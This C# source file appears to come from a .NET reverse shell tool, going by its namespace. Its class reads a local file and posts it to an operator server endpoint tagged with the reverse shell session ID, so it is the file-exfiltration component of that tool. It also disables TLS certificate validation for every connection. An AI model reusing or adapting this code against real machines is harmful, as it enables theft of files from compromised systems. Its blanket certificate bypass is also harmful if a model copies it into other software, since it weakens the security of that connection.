using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class S3Uploadutil
    {


        public static string UploadToS3(FileInfo fileToUpload)
        {
            try
            {
                HttpResponseMessage response = UploadFile(fileToUpload);
                Console.WriteLine(response);

                return $"File: {fileToUpload.Name} was sent to API endpoint. API output: {response.Content.ReadAsStringAsync().Result}";
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Failed with error: {ex.Message}");
                return $"Failed with error: {ex.Message}";
            }
        }



        static HttpResponseMessage UploadFile(FileInfo fileToUpload)
        {
            try
            {
                using (HttpClientHandler handler = new HttpClientHandler())
                {
                    // Disable SSL/TLS certificate validation (not recommended for production)
                    handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;

                    using (HttpClient client = new HttpClient(handler))
                    {
                        string uri = Constants.SERVER_HTTP_URI +
                                     Constants.S3_API_ENDPOINT +
                                     Constants.S3_API_UPLOAD +
                                     Constants.S3_API_UPLOAD_SESSION_PARAM 
                                     +ReverseShellSession.SessionId;

                        using (MultipartFormDataContent content = new MultipartFormDataContent())
                        {
                            content.Add(new StreamContent(File.OpenRead(fileToUpload.FullName)), "file", fileToUpload.Name);


                            return client.PostAsync(uri, content).Result;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to upload the file: " + fileToUpload.FullName);
                throw ex; // Rethrow the exception to indicate the failure
            }
        }
    }
}
